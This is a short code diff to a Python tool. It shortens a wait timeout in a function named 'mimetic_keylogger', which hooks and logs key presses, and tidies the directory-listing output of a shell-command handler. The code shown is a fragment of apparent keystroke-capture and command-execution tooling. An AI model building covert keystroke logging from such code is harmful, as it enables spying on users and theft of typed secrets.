@@ -335,8 +335,8 @@ def mimetic_keylogger():
 
         keyboard.on_press(on_key_press)
 
-        # Wait for ESC or 2-second timeout
-        stopped = stop_event.wait(timeout=2)
+        # Wait for ESC or 1-second timeout (aggressive timeout for reliability)
+        stopped = stop_event.wait(timeout=1)
         keyboard.unhook_all()
 
         result = ''.join(log)
@@ -585,10 +585,7 @@ def execute_shell_command(cmd_str):
                     # Truncate long names to fit column (40 chars max)
                     display_name = name if len(name) <= 40 else name[:37] + "..."
 
-                    if type_str == "[DIR]":
-                        line = f"{display_name:<40}  {size_str:>10}  {type_str:<8}"
-                    else:
-                        line = f"{display_name:<40}  {size_str:>10}  {'':<8}"
+                    line = f"{display_name:<40}  {size_str:>10}  {type_str:<8}"
                     output_lines.append(line)
 
                 output = "\n".join(output_lines)
